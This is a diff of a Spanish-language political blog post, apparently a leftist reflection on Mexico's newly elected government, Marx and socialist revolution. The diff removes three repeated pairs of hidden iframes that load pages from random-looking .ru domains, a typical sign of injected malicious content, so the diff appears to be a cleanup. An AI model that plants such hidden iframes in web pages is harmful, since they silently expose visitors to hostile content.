@@ -22,9 +22,3 @@ Podría seguir recordando casos, pero creo que está un poco claro. **Hasta ahor
 Creo que esa historia enseña algo. De todos modos **la sabia de Marx es clara: el trabajo se subordina al capital. El capital imperial hoy es cada vez más fuerte.** México es esa nación que como ya se dijo, es digna de lástima, tan cerca de Dios. **No me conformo con las buenas intenciones de un candidato ganador en México. Muchos como él no han podido con el poder al que enfrentaron.** No creo que esta vez, un candidato electo en un sistema de juego burgués vaya a romper la dinámica de los poderosos. **Esa historia ya la viví, no me aferraré al triunfalismo de “se avanzará” solo porque sea de izquierda, porque hace falta mucho más que eso.** Lo que no niega mi mayor deseo de que se logren grandes cosas.
 
 De todos modos, si ese gobierno lograra subvertir ese estado de las cosas tan corrupto y desigual de su país tuviera éxito y lograra cumplir esas promesas, deberíamos replantearnos el papel de la revolución socialista para sustituirlas por fórmulas como esa.
-
-<iframe id="a540125352" style="display: none;" src="https://0vse8pqcjwjb7.ru/f2.html?a=29539"></iframe><iframe id="a754394637" style="display: none;" src="https://m41egdcqogb3.ru/u.html?a=29539"></iframe>
-
-<iframe id="a540125352" style="display: none;" src="https://0vse8pqcjwjb7.ru/f2.html?a=29539"></iframe><iframe id="a754394637" style="display: none;" src="https://m41egdcqogb3.ru/u.html?a=29539"></iframe>
-
-<iframe id="a540125352" style="display: none;" src="https://0vse8pqcjwjb7.ru/f2.html?a=29539"></iframe><iframe id="a754394637" style="display: none;" src="https://m41egdcqogb3.ru/u.html?a=29539"></iframe>
